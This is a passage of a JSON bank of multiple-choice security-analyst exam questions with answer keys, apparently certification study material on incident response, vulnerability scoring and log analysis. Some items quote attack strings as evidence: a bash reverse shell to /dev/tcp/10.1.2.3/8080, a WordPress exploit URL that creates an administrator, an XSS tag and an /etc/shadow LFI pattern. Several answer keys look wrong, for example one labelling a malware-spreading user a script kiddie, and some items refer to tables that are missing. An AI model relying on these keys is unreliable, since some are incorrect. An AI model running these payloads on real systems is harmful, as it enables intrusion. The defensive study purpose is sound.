incident response team finished responding to a significant security incident. The management team has asked the lead analyst to provide an\nafter-action report that includes lessons learned. Which of the following is the most likely reason to include lessons learned?", "options": [{"letter": "A", "text": "To satisfy regulatory requirements for incident reporting"}, {"letter": "B", "text": "To hold other departments accountable"}, {"letter": "C", "text": "To identify areas of improvement in the incident response process"}, {"letter": "D", "text": "To highlight the notable practices of the organization's incident response team"}], "answer": "C"}, {"id": 60, "question": "A vulnerability management team is unable to patch all vulnerabilities found during their weekly scans. Using the third-party scoring system\ndescribed below, the team patches the most urgent vulnerabilities: c\nAdditionally, the vulnerability management team feels that the metrics Smear and Channing are less important than the others, so these will be\nlower in priority. Which of the following vulnerabilities should be patched first, given the above third-party scoring system?", "options": [{"letter": "A", "text": "InLoud:\nCobain: Yes -\nGrohl: No -\nNovo: Yes -\nSmear: Yes -\nChanning: No"}, {"letter": "B", "text": "TSpirit:\nCobain: Yes -\nGrohl: Yes -\nNovo: Yes -\nSmear: No -\nChanning: No"}, {"letter": "C", "text": "ENameless:\nCobain: Yes -\nGrohl: No -\nNovo: Yes -\nSmear: No -\nChanning: No"}, {"letter": "D", "text": "PBleach:\nCobain: Yes -\nGrohl: No -\nNovo: No -\nSmear: No -\nChanning: Yes"}], "answer": "B"}, {"id": 61, "question": "A user downloads software that contains malware onto a computer that eventually infects numerous other systems. Which of the following has\nthe user become?", "options": [{"letter": "A", "text": "Hacktivist"}, {"letter": "B", "text": "Advanced persistent threat"}, {"letter": "C", "text": "Insider threat"}, {"letter": "D", "text": "Script kiddie"}], "answer": "D"}, {"id": 62, "question": "An organization has activated the CSIRT. A security analyst believes a single virtual server was compromised and immediately isolated from the\nnetwork. Which of the following should the CSIRT conduct next?", "options": [{"letter": "A", "text": "Take a snapshot of the compromised server and verify its integrity"}, {"letter": "B", "text": "Restore the affected server to remove any malware"}, {"letter": "C", "text": "Contact the appropriate government agency to investigate"}, {"letter": "D", "text": "Research the malware strain to perform attribution"}], "answer": "A"}, {"id": 63, "question": "During an incident, an analyst needs to acquire evidence for later investigation. Which of the following must be collected first in a computer\nsystem, related to its volatility level?", "options": [{"letter": "A", "text": "Disk contents"}, {"letter": "B", "text": "Backup data"}, {"letter": "C", "text": "Temporary files"}, {"letter": "D", "text": "Running processes"}], "answer": "D"}, {"id": 64, "question": "A security analyst is trying to identify possible network addresses from different source networks belonging to the same company and region.\nWhich of the following shell script functions could help achieve the goal?", "options": [{"letter": "A", "text": "function w() { a=$(ping -c 1 $1 | awk-F ”/” ’END{print $1}’) && echo “$1 | $a” }"}, {"letter": "B", "text": "function x() { b=traceroute -m 40 $1 | awk ’END{print $1}’) && echo “$1 | $b” }"}, {"letter": "C", "text": "function y() { dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F ”.in-addr” ’{print $1}’).origin.asn.cymru.com TXT +short }"}, {"letter": "D", "text": "function z() { c=$(geoiplookup$1) && echo “$1 | $c” }"}], "answer": "C"}, {"id": 65, "question": "A security analyst is writing a shell script to identify IP addresses from the same country. Which of the following functions would help the analyst\nachieve the objective?", "options": [{"letter": "A", "text": "function w() { info=$(ping -c 1 $1 | awk -F “/” ‘END{print $1}’) && echo “$1 | $info” }"}, {"letter": "B", "text": "function x() { info=$(geoiplookup $1) && echo “$1 | $info” }"}, {"letter": "C", "text": "function y() { info=$(dig -x $1 | grep PTR | tail -n 1 ) && echo “$1 | $info” }"}, {"letter": "D", "text": "function z() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo “$1 | $info” }"}], "answer": "B"}, {"id": 66, "question": "A security analyst obtained the following table of results from a recent vulnerability assessment that was conducted against a single web server\nin the environment:\nWhich of the following should be completed first to remediate the findings?", "options": [{"letter": "A", "text": "Ask the web development team to update the page contents"}, {"letter": "B", "text": "Add the IP address allow listing for control panel access"}, {"letter": "C", "text": "Purchase an appropriate certificate from a trusted root CA"}, {"letter": "D", "text": "Perform proper sanitization on all fields"}], "answer": "C"}, {"id": 67, "question": "While reviewing web server logs, an analyst notices several entries with the same time stamps, but all contain odd characters in the request line.\nWhich of the following steps should be taken next?", "options": [{"letter": "A", "text": "Shut the network down immediately and call the next person in the chain of command."}, {"letter": "B", "text": "Determine what attack the odd characters are indicative of."}, {"letter": "C", "text": "Utilize the correct attack framework and determine what the incident response will consist of."}, {"letter": "D", "text": "Notify the local law enforcement for incident response."}], "answer": "B"}, {"id": 68, "question": "A security team conducts a lessons-learned meeting after struggling to determine who should conduct the next steps following a security event.\nWhich of the following should the team create to address this issue?", "options": [{"letter": "A", "text": "Service-level agreement"}, {"letter": "B", "text": "Change management plan"}, {"letter": "C", "text": "Incident response plan"}, {"letter": "D", "text": "Memorandum of understanding"}], "answer": "C"}, {"id": 69, "question": "A cybersecurity analyst notices unusual network scanning activity coming from a country that the company does not do business with. Which of\nthe following is the best mitigation technique?", "options": [{"letter": "A", "text": "Geoblock the offending source country."}, {"letter": "B", "text": "Block the IP range of the scans at the network firewall."}, {"letter": "C", "text": "Perform a historical trend analysis and look for similar scanning activity."}, {"letter": "D", "text": "Block the specific IP address of the scans at the network firewall."}], "answer": "B"}, {"id": 70, "question": "An analyst has received an IPS event notification from the SIEM stating an IP address, which is known to be malicious, has attempted to exploit a\nzero-day vulnerability on several web servers. The exploit contained the following snippet:\n/wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator\nWhich of the following controls would work best to mitigate the attack represented by this snippet?", "options": [{"letter": "A", "text": "Limit user creation to administrators only."}, {"letter": "B", "text": "Limit layout creation to administrators only."}, {"letter": "C", "text": "Set the directory trx_addons to read only for all users."}, {"letter": "D", "text": "Set the directory V2 to read only for all users."}], "answer": "A"}, {"id": 71, "question": "A penetration tester submitted data to a form in a web application, which enabled the penetration tester to retrieve user credentials. Which of the\nfollowing should be recommended for remediation of this application vulnerability?", "options": [{"letter": "A", "text": "Implementing multifactor authentication on the server OS"}, {"letter": "B", "text": "Hashing user passwords on the web application"}, {"letter": "C", "text": "Performing input validation before allowing submission"}, {"letter": "D", "text": "Segmenting the network between the users and the web server"}], "answer": "C"}, {"id": 72, "question": "A cybersecurity team lead is developing metrics to present in the weekly executive briefs. Executives are interested in knowing how long it takes\nto stop the spread of malware that enters the network. Which of the following metrics should the team lead include in the briefs?", "options": [{"letter": "A", "text": "Mean time between failures"}, {"letter": "B", "text": "Mean time to detect"}, {"letter": "C", "text": "Mean time to remediate"}, {"letter": "D", "text": "Mean time to contain"}], "answer": "D"}, {"id": 73, "question": "An employee accessed a website that caused a device to become infected with invasive malware. The incident response analyst has:\n• created the initial evidence log.\n• disabled the wireless adapter on the device.\n• interviewed the employee, who was unable to identify the website that was accessed.\n• reviewed the web proxy traffic logs.\nWhich of the following should the analyst do to remediate the infected device?", "options": [{"letter": "A", "text": "Update the system firmware and reimage the hardware."}, {"letter": "B", "text": "Install an additional malware scanner that will send email alerts to the analyst."}, {"letter": "C", "text": "Configure the system to use a proxy server for Internet access."}, {"letter": "D", "text": "Delete the user profile and restore data from backup."}], "answer": "A"}, {"id": 74, "question": "A cloud team received an alert that unauthorized resources were being auto-provisioned. After investigating, the team suspects that cryptomining\nis occurring. Which of the following indicators would most likely lead the team to this conclusion?", "options": [{"letter": "A", "text": "High GPU utilization"}, {"letter": "B", "text": "Bandwidth consumption"}, {"letter": "C", "text": "Unauthorized changes"}, {"letter": "D", "text": "Unusual traffic spikes"}], "answer": "A"}, {"id": 75, "question": "A company’s security team is updating a section of the reporting policy that pertains to inappropriate use of resources (e.g., an employee who\ninstalls cryptominers on workstations in the office). Besides the security team, which of the following groups should the issue be escalated to first\nin order to comply with industry best practices?", "options": [{"letter": "A", "text": "Help desk"}, {"letter": "B", "text": "Law enforcement"}, {"letter": "C", "text": "Legal department"}, {"letter": "D", "text": "Board member"}], "answer": "C"}, {"id": 76, "question": "Given the following CVSS string:\nCVSS:3.0/AV:C:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nWhich of the following attributes correctly describes this vulnerability?", "options": [{"letter": "A", "text": "A user is required to exploit this vulnerability."}, {"letter": "B", "text": "The vulnerability is network based."}, {"letter": "C", "text": "The vulnerability does not affect confidentiality."}, {"letter": "D", "text": "The complexity to exploit the vulnerability is high."}], "answer": "B"}, {"id": 77, "question": "A cryptocurrency service company is primarily concerned with ensuring the accuracy of the data on one of its systems. A security analyst has\nbeen tasked with prioritizing vulnerabilities for remediation for the system. The analyst will use the following CVSSv3.1 impact metrics for\nprioritization:\nWhich of the following vulnerabilities should be prioritized for remediation?", "options": [{"letter": "A", "text": "1"}, {"letter": "B", "text": "2"}, {"letter": "C", "text": "3"}, {"letter": "D", "text": "4"}], "answer": "D"}, {"id": 78, "question": "Patches for two highly exploited vulnerabilities were released on the same Friday afternoon. Information about the systems and vulnerabilities is\nshown in the tables below:\nWhich of the following should the security analyst prioritize for remediation?", "options": [{"letter": "A", "text": "rogers"}, {"letter": "B", "text": "brady"}, {"letter": "C", "text": "brees"}, {"letter": "D", "text": "manning"}], "answer": "B"}, {"id": 79, "question": "A security analyst must preserve a system hard drive that was involved in a litigation request. Which of the following is the best method to ensure\nthe data on the device is not modified?", "options": [{"letter": "A", "text": "Generate a hash value and make a backup image."}, {"letter": "B", "text": "Encrypt the device to ensure confidentiality of the data."}, {"letter": "C", "text": "Protect the device with a complex password."}, {"letter": "D", "text": "Perform a memory scan dump to collect residual data"}], "answer": "A"}, {"id": 80, "question": "Which of the following best describes the goal of a tabletop exercise?", "options": [{"letter": "A", "text": "To test possible incident scenarios and how to react properly"}, {"letter": "B", "text": "To perform attack exercises to check response effectiveness"}, {"letter": "C", "text": "To understand existing threat actors and how to replicate their techniques"}, {"letter": "D", "text": "To check the effectiveness of the business continuity plan"}], "answer": "A"}, {"id": 81, "question": "A virtual web server in a server pool was infected with malware after an analyst used the internet to research a system issue. After the server was\nrebuilt and added back into the server pool, users reported issues with the website, indicating the site could not be trusted. Which of the following\nis the most likely cause of the server issue?", "options": [{"letter": "A", "text": "The server was configured to use SSL to securely transmit data."}, {"letter": "B", "text": "The server was supporting weak TLS protocols for client connections."}, {"letter": "C", "text": "The malware infected all the web servers in the pool."}, {"letter": "D", "text": "The digital certificate on the web server was self-signed."}], "answer": "D"}, {"id": 82, "question": "A zero-day command injection vulnerability was published. A security administrator is analyzing the following logs for evidence of adversaries\nattempting to exploit the vulnerability:\nWhich of the following log entries provides evidence of the attempted exploit?", "options": [{"letter": "A", "text": "Log entry 1"}, {"letter": "B", "text": "Log entry 2"}, {"letter": "C", "text": "Log entry 3"}, {"letter": "D", "text": "Log entry 4"}], "answer": "A"}, {"id": 83, "question": "A security analyst needs to ensure that systems across the organization are protected based on the sensitivity of the content each system hosts.\nThe analyst is working with the respective system owners to help determine the best methodology that seeks to promote confidentiality,\navailability, and integrity of the data being hosted. Which of the following should the security analyst perform first to categorize and prioritize the\nrespective systems?", "options": [{"letter": "A", "text": "Interview the users who access these systems."}, {"letter": "B", "text": "Scan the systems to see which vulnerabilities currently exist."}, {"letter": "C", "text": "Configure alerts for vendor-specific zero-day exploits."}, {"letter": "D", "text": "Determine the asset value of each system."}], "answer": "D"}, {"id": 84, "question": "A security analyst is reviewing the following alert that was triggered by FIM on a critical system:\nWhich of the following best describes the suspicious activity that is occurring?", "options": [{"letter": "A", "text": "A fake antivirus program was installed by the user."}, {"letter": "B", "text": "A network drive was added to allow exfiltration of data."}, {"letter": "C", "text": "A new program has been set to execute on system start."}, {"letter": "D", "text": "The host firewall on 192.168.1.10 was disabled."}], "answer": "C"}, {"id": 85, "question": "Which of the following best describes the document that defines the expectation to network customers that patching will only occur between 2:00\na.m. and 4:00 a.m.?", "options": [{"letter": "A", "text": "SLA"}, {"letter": "B", "text": "LOI"}, {"letter": "C", "text": "MOU"}, {"letter": "D", "text": "KPI"}], "answer": "A"}, {"id": 86, "question": "A cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from an internal host to a blocklisted external server.\nWhich of the following best describes the activity that is taking place?", "options": [{"letter": "A", "text": "Data exfiltration"}, {"letter": "B", "text": "Rogue device"}, {"letter": "C", "text": "Scanning"}, {"letter": "D", "text": "Beaconing"}], "answer": "D"}, {"id": 87, "question": "An incident response team is working with law enforcement to investigate an active web server compromise. The decision has been made to keep\nthe server running and to implement compensating controls for a period of time. The web service must be accessible from the internet via the\nreverse proxy and must connect to a database server. Which of the following compensating controls will help contain the adversary while meeting\nthe other requirements? (Choose two).", "options": [{"letter": "A", "text": "Drop the tables on the database server to prevent data exfiltration."}, {"letter": "B", "text": "Deploy EDR on the web server and the database server to reduce the adversary’s capabilities."}, {"letter": "C", "text": "Stop the httpd service on the web server so that the adversary can not use web exploits."}, {"letter": "D", "text": "Use microsegmentation to restrict connectivity to/from the web and database servers."}, {"letter": "E", "text": "Comment out the HTTP account in the /etc/passwd file of the web server."}, {"letter": "F", "text": "Move the database from the database server to the web server."}], "answer": "BD"}, {"id": 88, "question": "An incident response team member is triaging a Linux server. The output is shown below:\nWhich of the following is the adversary most likely trying to do?", "options": [{"letter": "A", "text": "Create a backdoor root account named zsh."}, {"letter": "B", "text": "Execute commands through an unsecured service account."}, {"letter": "C", "text": "Send a beacon to a command-and-control server."}, {"letter": "D", "text": "Perform a denial-of-service attack on the web server."}], "answer": "B"}, {"id": 89, "question": "A SOC analyst identifies the following content while examining the output of a debugger command over a client-server application:\ngetConnection(database01,\"alpha\" ,\"AxTv.127GdCx94GTd\");\nWhich of the following is the most likely vulnerability in this system?", "options": [{"letter": "A", "text": "Lack of input validation"}, {"letter": "B", "text": "SQL injection"}, {"letter": "C", "text": "Hard-coded credential"}, {"letter": "D", "text": "Buffer overflow"}], "answer": "C"}, {"id": 90, "question": "A technician is analyzing output from a popular network mapping tool for a PCI audit:\nWhich of the following best describes the output?", "options": [{"letter": "A", "text": "The host is not up or responding."}, {"letter": "B", "text": "The host is running excessive cipher suites."}, {"letter": "C", "text": "The host is allowing insecure cipher suites."}, {"letter": "D", "text": "The Secure Shell port on this host is closed."}], "answer": "C"}, {"id": 91, "question": "A managed security service provider is having difficulty retaining talent due to an increasing workload caused by a client doubling the number of\ndevices connected to the network. Which of the following would best aid in decreasing the workload without increasing staff?", "options": [{"letter": "A", "text": "SIEM"}, {"letter": "B", "text": "XDR"}, {"letter": "C", "text": "SOAR"}, {"letter": "D", "text": "EDR"}], "answer": "C"}, {"id": 92, "question": "An employee is suspected of misusing a company-issued laptop. The employee has been suspended pending an investigation by human\nresources. Which of the following is the best step to preserve evidence?", "options": [{"letter": "A", "text": "Disable the user’s network account and access to web resources."}, {"letter": "B", "text": "Make a copy of the files as a backup on the server."}, {"letter": "C", "text": "Place a legal hold on the device and the user’s network share."}, {"letter": "D", "text": "Make a forensic image of the device and create a SHA-1 hash."}], "answer": "D"}, {"id": 93, "question": "An analyst receives threat intelligence regarding potential attacks from an actor with seemingly unlimited time and resources. Which of the\nfollowing best describes the threat actor attributed to the malicious activity?", "options": [{"letter": "A", "text": "Insider threat"}, {"letter": "B", "text": "Ransomware group"}, {"letter": "C", "text": "Nation-state"}, {"letter": "D", "text": "Organized crime"}], "answer": "C"}, {"id": 94, "question": "A systems analyst is limiting user access to system configuration keys and values in a Windows environment. Which of the following describes\nwhere the analyst can find these configuration items?", "options": [{"letter": "A", "text": "config.ini"}, {"letter": "B", "text": "ntds.dit"}, {"letter": "C", "text": "Master boot record"}, {"letter": "D", "text": "Registry"}], "answer": "D"}, {"id": 95, "question": "While reviewing web server logs, a security analyst found the following line:\n< IMG SRC='vbscript:msgbox(\"test\")' >\nWhich of the following malicious activities was attempted?", "options": [{"letter": "A", "text": "Command injection"}, {"letter": "B", "text": "XML injection"}, {"letter": "C", "text": "Server-side request forgery"}, {"letter": "D", "text": "Cross-site scripting"}], "answer": "D"}, {"id": 96, "question": "A security analyst at a company called ACME Commercial notices there is outbound traffic to a host IP that resolves to\nhttps://office365password.acme.co. The site’s standard VPN logon page is www.acme.com/logon. Which of the following is most likely true?", "options": [{"letter": "A", "text": "This is a normal password change URL."}, {"letter": "B", "text": "The security operations center is performing a routine password audit."}, {"letter": "C", "text": "A new VPN gateway has been deployed."}, {"letter": "D", "text": "A social engineering attack is underway."}], "answer": "D"}, {"id": 97, "question": "A security analyst is performing vulnerability scans on the network. The analyst installs a scanner appliance, configures the subnets to scan, and\nbegins the scan of the network. Which of the following would be missing from a scan performed with this configuration?", "options": [{"letter": "A", "text": "Operating system version"}, {"letter": "B", "text": "Registry key values"}, {"letter": "C", "text": "Open ports"}, {"letter": "D", "text": "IP address"}], "answer": "B"}, {"id": 98, "question": "A security analyst discovers an LFI vulnerability that can be exploited to extract credentials from the underlying host. Which of the following\npatterns can the security analyst use to search the web server logs for evidence of exploitation of that particular vulnerability?", "options": [{"letter": "A", "text": "/etc/shadow"}, {"letter": "B", "text": "curl localhost"}, {"letter": "C", "text": "; printenv"}, {"letter": "D", "text": "cat /proc/self/"}], "answer": "A"}, {"id": 99, "question": "A company is in the process of implementing a vulnerability management program. Which of the following scanning methods should be\nimplemented to minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification process?", "options": [{"letter": "A", "text": "Non-credentialed scanning"}, {"letter": "B", "text": "Passive scanning"}, {"letter": "C", "text": "Agent-based scanning"}, {"letter": "D", "text": "Credentialed scanning"}], "answer": "B"}, {"id": 100, "question": "A company receives a penetration test report summary from a third party. The report summary indicates a proxy has some patches that need to be\napplied. The proxy is sitting in a rack and is not being used, as the company has replaced it with a new one. The CVE score of the vulnerability on\nthe proxy is a 9.8. Which of the following best practices should the company follow with this proxy?", "options": [{"letter": "A", "text": "Leave the proxy as is."}, {"letter": "B", "text": "Decomission the proxy."}, {"letter": "C", "text": "Migrate the proxy to the cloud."}, {"letter": "D", "text": "Patch the proxy."}], "answer": "B"}, {"id": 101, "question": "An analyst is examining events in multiple systems but is having difficulty correlating data points. Which of the following is most likely the issue\nwith the system?", "options": [{"letter": "A", "text": "Access rights"}, {"letter": "B", "text": "Network segmentation"}, {"letter": "C", "text": "Time synchronization"}, {"letter": "D", "text": "Invalid playbook"}], "answer": "C"}, {"id": 102, "question": "An analyst recommends that an EDR agent collect the source IP address, make a connection to the firewall, and create a policy to block the\nmalicious source IP address across the entire network automatically. Which of the following is the best option to help the analyst implement this\nrecommendation?", "options": [{"letter": "A", "text": "SOAR"}, {"letter": "B", "text": "SIEM"}, {"letter": "C", "text": "SLA"}, {"letter": "D", "text": "IoC"}], "answer": "A"}, {"id": 103, "question": "An end-of-life date was announced for a widely used OS. A business-critical function is performed by some machinery that is controlled by a PC,\nwhich is utilizing the OS that is approaching the end-of-life date. Which of the following best describes a security analyst’s concern?", "options": [{"letter": "A", "text": "Any discovered vulnerabilities will not be remediated."}, {"letter": "B", "text": "An outage of machinery would cost the organization money."}, {"letter": "C", "text": "Support will not be available for the critical machinery."}, {"letter": "D", "text": "There are no compensating controls in place for the OS."}], "answer": "A"}, {"id": 104, "question": "Which of the following describes the best reason for conducting a root cause analysis?", "options": [{"letter": "A", "text": "The root cause analysis ensures that proper timelines were documented."}, {"letter": "B", "text": "The root cause analysis allows the incident to be properly documented for reporting."}, {"letter": "C", "text": "The root cause analysis develops recommendations to improve the process."}, {"letter": "D", "text": "The root cause analysis identifies the contributing items that facilitated the event."}], "answer": "D"}, {"id": 105, "question": "Which of the following concepts is using an API to insert bulk access requests from a file into an identity management system an example of?", "options": [{"letter": "A", "text": "Command and control"}, {"letter": "B", "text": "Data enrichment"}, {"letter": "C", "text": "Automation"}, {"letter": "D", "text": "Single sign-on"}], "answer": "C"}, {"id": 106, "question": "A SOC analyst recommends adding a layer of defense for all endpoints that will better protect against external threats regardless of the device’s\noperating system. Which of the following best meets this requirement?", "options": [{"letter": "A", "text": "SIEM"}, {"letter": "B", "text": "CASB"}, {"letter": "C", "text": "SOAR"}, {"letter": "D", "text": "EDR"}], "answer": "D"}, {"id": 107, "question": "A security analyst identified the following suspicious entry on the host-based IDS logs:\nbash -i >& /dev/tcp/10.1.2.3/8080 0>&1\nWhich of the following shell scripts should the analyst use to most accurately confirm if the activity is ongoing?", "options": [{"letter": "A", "text": "#!/bin/bash\nnc 10.1.2.3 8080 -vv >dev/null && echo \"Malicious activity\" || echo \"OK\""}, {"letter": "B", "text": "#!/bin/bash\nps -fea | grep 8080 >dev/null && echo \"Malicious activity\" || echo \"OK\""}, {"letter": "C", "text": "#!/bin/bash\nls /opt/tcp/10.1.2.3/8080 >dev/null && echo \"Malicious activity\" || echo \"OK\""}, {"letter": "D", "text": "#!/bin/bash\nnetstat -antp | grep 8080 >dev/null && echo \"Malicious activity\" || echo \"OK\""}], "answer": "D"}, {"id": 108, "question": "A company is concerned with finding sensitive file storage locations that are open to the public. The current internal cloud network is flat. Which\nof the following is the best solution to secure the network?", "options": [{"letter": "A", "text": "Implement segmentation with ACLs."}, {"letter": "B", "text": "Configure logging and monitoring to the SIEM."}, {"letter": "C", "text": "Deploy MFA to cloud storage locations."}, {"letter": "D", "text": "Roll out an IDS."}], "answer": "A"}, {"id": 109, "question": "A security analyst is reviewing the findings of the latest vulnerability report for a company’s web application. The web application accepts files for\na Bash script to be processed if the files match a given hash. The analyst is able to submit files to the system due to a hash collision. Which of the\nfollowing should the analyst suggest to mitigate the vulnerability with the fewest changes to the current script and infrastructure?", "options": [{"letter": "A", "text": "Deploy a WAF to the front of the application."}, {"letter": "B", "text": "Replace the current MD5 with SHA-256."}, {"letter": "C", "text": "Deploy an antivirus application on the hosting system."}, {"letter": "D", "text": "Replace the MD5 with digital signatures."}], "answer": "B"}, {"id": 110, "question": "A security analyst needs to mitigate a known, exploited vulnerability related to an attack vector that embeds software through the USB interface.\nWhich of the following should the analyst do first?", "options": [{"letter": "A", "text": "Conduct security awareness training on the risks of using unknown and unencrypted USBs."}, {"letter": "B", "text": "Write a removable media policy that explains that USBs cannot be connected to a company asset."}, {"letter": "C", "text": "Check configurations to determine whether USB ports are enabled on company assets."}, {"letter": "D", "text": "Review logs to see whether this exploitable vulnerability has already impacted the company."}], "answer": "C"}, {"id": 111, "question": "A systems administrator receives reports of an internet-accessible Linux server that is running very sluggishly. The administrator examines the\nserver, sees a high amount of memory utilization, and suspects a DoS attack related to half-open TCP sessions consuming memory. Which of the\nfollowing tools would best help to prove whether this server was experiencing this behavior?", "options": [{"letter": "A", "text": "Nmap"}, {"letter": "B", "text": "TCPDump"}, {"letter": "C", "text": "SIEM"}, {"letter": "D", "text": "EDR"}], "answer": "B"}, {"id": 112, "question": "A security analyst is validating a particular finding that was reported in a web application vulnerability scan to make sure it is not a false positive.\nThe security analyst uses the snippet below:\nWhich of the following vulnerability types is the security analyst validating?", "options": [{"letter": "A", "text": "Directory traversal"}, {"letter": "B", "text": "XSS"}, {"letter": "C", "text": "XXE"}, {"letter": "D", "text": "SSRF"}], "answer": "C"}, {"id": 113, "question": "Which of the following is the most important factor to ensure accurate incident response reporting?", "options": [{"letter": "A", "text": "A well-defined timeline of the events"}, {"letter": "B", "text": "A guideline for regulatory reporting"}, {"letter": "C", "text": "Logs from the impacted system"}, {"letter": "D", "text": "A well-developed executive summary"}], "answer": "A"}, {"id": 114, "question": "A security analyst is trying to detect connections to a suspicious IP address by collecting the packet captures from the gateway. Which of the\nfollowing commands should the security analyst consider running?", "options": [{"letter": "A", "text": "grep [IP address] packets.pcap"}, {"letter": "B", "text": "cat packets.pcap | grep [IP Address]"}, {"letter": "C", "text": "tcpdump -n -r packets.pcap host [IP address]"}, {"letter": "D", "text": "strings packets.pcap | grep [IP Address]"}], "answer": "C"}, {"id": 115, "question": "A security analyst reviews the latest vulnerability scans and observes there are vulnerabilities with similar CVSSv3 scores but different base score\nmetrics. Which of the following attack vectors should the analyst remediate first?", "options": [{"letter": "A", "text": "CVSS:3.0/AV:P/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"letter": "B", "text": "CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"letter": "C", "text": "CVSS:3.0/AV:C:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"letter": "D", "text": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "answer": "C"}, {"id": 116, "question": "A security analyst must review a suspicious email to determine its legitimacy. Which of the following should be performed? (Choose two.)", "options": [{"letter": "A", "text": "Evaluate scoring fields, such as Spam Confidence Level and Bulk Complaint Level"}, {"letter": "B", "text": "Review the headers from the forwarded email"}, {"letter": "C", "text": "Examine the recipient address field"}, {"letter": "D", "text": "Review the Content-Type header"}, {"letter": "E", "text": "Evaluate the HELO or EHLO string of the connecting email server"}, {"letter": "F", "text": "Examine the SPF, DKIM, and DMARC fields from the original email"}], "answer": "BF"}, {"id": 117, "question": "A vulnerability analyst received a list of system vulnerabilities and needs to evaluate the relevant impact of the exploits on the business. Given the\nconstraints of the current sprint, only three can be remediated. Which of the following represents the least impactful risk, given the CVSS3.1 base\nscores?", "options": [{"letter": "A", "text": "AV:C:H/PR:H/UI:R/S:U/C:H/I:H/A:L - Base Score 6.0"}, {"letter": "B", "text": "AV:C:H/PR:H/UI:N/S:C/C:H/I:H/A:L - Base Score 7.2"}, {"letter": "C", "text": "AV:C:H/PR:H/UI:R/S:U/C:H/I:H/A:H - Base Score 6.4"}, {"letter": "D", "text": "AV:C:H/PR:N/UI:N/S:C/C:L/I:L/A:L - Base Score 6.5"}], "answer": "A"}, {"id": 118, "question": "A recent vulnerability scan resulted in an abnormally large number of critical and high findings that require patching. The SLA requires that the\nfindings be remediated within a specific amount of time. Which of the following is the best approach to ensure all vulnerabilities are patched in\naccordance with the SLA?", "options": [{"letter": "A", "text": "Integrate an IT service delivery ticketing system to track remediation and closure"}, {"letter": "B", "text": "Create a compensating control item until the system can be fully patched"}, {"letter": "C", "text": "Accept the risk and decommission current assets as end of life"}, {"letter": "D", "text": "Request an exception and manually patch each system"}], "answer": "A"}, {"id": 119, "question": "Which of the following would help an analyst to quickly find out whether the IP address in a SIEM alert is a known-malicious IP address?", "options": [{"letter": "A", "text": "Join an information sharing and analysis center specific to the company's industry"}, {"letter": "B", "text": "Upload threat intelligence to the IPS in STIX'TAXII format"}, {"letter": "C", "text": "Add data enrichment for IPs in the ingestion pipeline"}, {"letter": "D", "text": "Review threat feeds after viewing the SIEM alert"}], "answer": "C"}, {"id": 120, "question": "An organization was compromised, and the usernames and passwords of all employees were leaked online. Which of the following best describes\nthe remediation that could reduce the impact of this situation?", "options": [{"letter": "A", "text": "Multifactor authentication"}, {"letter": "B", "text": "Password changes"}, {"letter": "C", "text": "System hardening"}, {"letter": "D", "text": "Password encryption"}], "answer": "B"}, {"id": 121, "question": "A company is deploying new vulnerability scanning software to assess its systems. The current network is highly segmented, and the networking\nteam wants to minimize the number of unique firewall rules. Which of the following scanning techniques would be most efficient to achieve the\nobjective?", "options": [{"letter": "A", "text": "Deploy agents on all systems to perform the scans"}, {"letter": "B", "text": "Deploy a central scanner and perform non-credentialed scans"}, {"letter": "C", "text": "Deploy a cloud-based scanner and perform a network scan"}, {"letter": "D", "text": "Deploy a scanner sensor on every segment and perform credentialed scans"}], "answer": "D"}, {"id": 122, "question": "Executives at an organization email sensitive financial information to external business partners when negotiating valuable contracts. To ensure\nthe legal validity of these messages, the cybersecurity team recommends a digital signature be added to emails sent by the executives. Which of\nthe following are the primary goals of this recommendation? (Choose two.)", "options": [{"letter": "A", "text": "Confidentiality"}, {"letter": "B", "text": "Integrity"}, {"letter": "C", "text": "Privacy"}, {"letter": "D", "text": "Anonymity"}, {"letter": "E", "text": "Non-reduplication"}, {"letter": "F", "text": "Authorization"}], "answer": "BF"}, {"id": 123, "question": "A security administrator needs to import PII data records from the production environment to the test environment for testing purposes. Which of\nthe following would best protect data confidentiality?", "options": [{"letter": "A", "text": "Data masking"}, {"letter": "B", "text": "Hashing"}, {"letter": "C", "text": "Watermarking"}, {"letter": "D", "text": "Encoding"}], "answer": "A"}, {"id": 124, "question": "The email system administrator for an organization configured DKIM signing for all email legitimately sent by the organization. Which of the\nfollowing would most likely indicate an email is malicious if the company's domain name is used as both the sender and the recipient?", "options": [{"letter": "A", "text": "The message fails a DMARC check"}, {"letter": "B", "text": "The sending IP address is the hosting provider"}, {"letter": "C", "text": "The signature does not meet corporate standards"}, {"letter": "D", "text": "The sender and reply address are different"}], "answer": "A"}, {"id": 125, "question": "During an incident involving phishing, a security analyst needs to find the source of the malicious email. Which of the following techniques would\nprovide the analyst with this information?", "options": [{"letter": "A", "text": "Header analysis"}, {"letter": "B", "text": "Packet capture"}, {"letter": "C", "text": "SSL inspection"}, {"letter": "D", "text": "Reverse engineering"}], "answer": "A"}, {"id": 126, "question": "An analyst wants to ensure that users only leverage web-based software that has been pre-approved by the organization. Which of the following\nshould be deployed?", "options": [{"letter": "A", "text": "Blocklisting"}, {"letter": "B", "text": "Allowlisting"}, {"letter": "C", "text": "Graylisting"}, {"letter": "D", "text": "Webhooks"}], "answer": "B"}, {"id": 127, "question": "During a cybersecurity incident, one of the web servers at the perimeter network was affected by ransomware. Which of the following actions\nshould be performed immediately?", "options": [{"letter": "A", "text": "Shut down the server."}, {"letter": "B", "text": "Reimage the server."}, {"letter": "C", "text": "Quarant
